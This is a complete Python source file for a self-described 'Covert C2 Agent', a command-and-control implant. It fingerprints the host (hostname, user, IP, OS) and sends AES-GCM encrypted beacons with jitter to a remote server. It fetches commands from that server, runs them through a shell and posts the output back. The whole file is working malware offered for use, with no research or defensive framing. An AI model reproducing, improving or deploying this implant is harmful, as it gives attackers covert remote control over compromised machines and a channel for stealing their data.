import argparse
import json
import os
import platform
import random
import socket
import subprocess
import time
import base64

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class C2Agent:
    def __init__(self, server_url, agent_id, secret_key, beacon_interval=60, jitter=0.2):
        self.server_url = server_url.rstrip("/")
        self.agent_id = agent_id
        self.secret_key = secret_key
        if isinstance(self.secret_key, str):
            self.secret_key = self.secret_key.encode("utf-8")
        if len(self.secret_key) < 32:
            self.secret_key = self.secret_key.ljust(32, b"\0")
        elif len(self.secret_key) > 32:
            self.secret_key = self.secret_key[:32]
        self.beacon_interval = beacon_interval
        self.jitter = jitter
        self.aesgcm = AESGCM(self.secret_key)

    def generate_beacon(self):
        try:
            hostname = socket.gethostname()
        except Exception:
            hostname = "unknown"
        try:
            username = os.getlogin()
        except Exception:
            username = os.environ.get("USER", "unknown")
        try:
            ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            ip = "127.0.0.1"
        return {
            "agent_id": self.agent_id,
            "system_info": {
                "hostname": hostname,
                "os": platform.system(),
                "os_release": platform.release(),
                "arch": platform.machine(),
                "user": username,
                "ip": ip,
            },
            "timestamp": time.time(),
        }

    def encrypt_payload(self, data):
        nonce = os.urandom(12)
        plaintext = json.dumps(data).encode("utf-8")
        ciphertext = self.aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ciphertext).decode("utf-8")

    def decrypt_response(self, encrypted_b64):
        raw = base64.b64decode(encrypted_b64)
        nonce = raw[:12]
        ciphertext = raw[12:]
        plaintext = self.aesgcm.decrypt(nonce, ciphertext, None)
        return json.loads(plaintext.decode("utf-8"))

    def send_beacon(self):
        beacon_data = self.generate_beacon()
        encrypted = self.encrypt_payload(beacon_data)
        try:
            resp = requests.post(
                self.server_url + "/api/v1/beacon",
                json={"payload": encrypted},
                timeout=10,
            )
            if resp.status_code == 200:
                body = resp.json()
                if "payload" in body:
                    return self.decrypt_response(body["payload"])
                return body
        except requests.RequestException:
            pass
        return None

    def get_commands(self):
        try:
            resp = requests.get(
                self.server_url + "/api/v1/commands/" + self.agent_id + "?enc=true",
                timeout=10,
            )
            if resp.status_code == 200:
                body = resp.json()
                if "payload" in body:
                    decrypted = self.decrypt_response(body["payload"])
                    return decrypted.get("commands", [])
                return body.get("commands", [])
        except requests.RequestException:
            pass
        return []

    def execute_command(self, cmd):
        try:
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate(timeout=30)
            output = stdout.decode("utf-8", errors="replace")
            err = stderr.decode("utf-8", errors="replace")
            if err:
                output += "\n" + err
            return output, proc.returncode
        except subprocess.TimeoutExpired:
            return "Command timed out", -1
        except Exception as e:
            return str(e), -1

    def send_results(self, cmd_id, output, exit_code=0):
        data = {
            "agent_id": self.agent_id,
            "cmd_id": cmd_id,
            "output": output,
            "exit_code": exit_code,
            "timestamp": time.time(),
        }
        encrypted = self.encrypt_payload(data)
        try:
            requests.post(
                self.server_url + "/api/v1/beacon",
                json={"payload": encrypted},
                timeout=10,
            )
        except requests.RequestException:
            pass

    def run(self):
        print("[Agent {}] Starting. Beacon interval: {}s, jitter: {}%".format(
            self.agent_id, self.beacon_interval, int(self.jitter * 100)))
        while True:
            response = self.send_beacon()
            if response:
                commands = response.get("commands", [])
                for cmd_entry in commands:
                    cmd_id = cmd_entry["cmd_id"]
                    command = cmd_entry["command"]
                    print("[Agent {}] Executing: {}".format(self.agent_id, command))
                    output, exit_code = self.execute_command(command)
                    self.send_results(cmd_id, output, exit_code)
                    print("[Agent {}] Result sent for {}".format(self.agent_id, cmd_id))

            jittered = self.beacon_interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(max(1, jittered))


def main():
    parser = argparse.ArgumentParser(description="Covert C2 Agent")
    parser.add_argument("--server-url", required=True, help="C2 server URL")
    parser.add_argument("--agent-id", default=None, help="Agent identifier")
    parser.add_argument("--secret-key", required=True, help="Shared secret key")
    parser.add_argument("--beacon-interval", type=int, default=60, help="Beacon interval in seconds")
    parser.add_argument("--jitter", type=float, default=0.2, help="Jitter percentage (0.0-1.0)")
    args = parser.parse_args()

    agent_id = args.agent_id or "agent-" + base64.b64encode(os.urandom(6)).decode("utf-8").rstrip("=")
    agent = C2Agent(
        server_url=args.server_url,
        agent_id=agent_id,
        secret_key=args.secret_key,
        beacon_interval=args.beacon_interval,
        jitter=args.jitter,
    )
    agent.run()


if __name__ == "__main__":
    main()
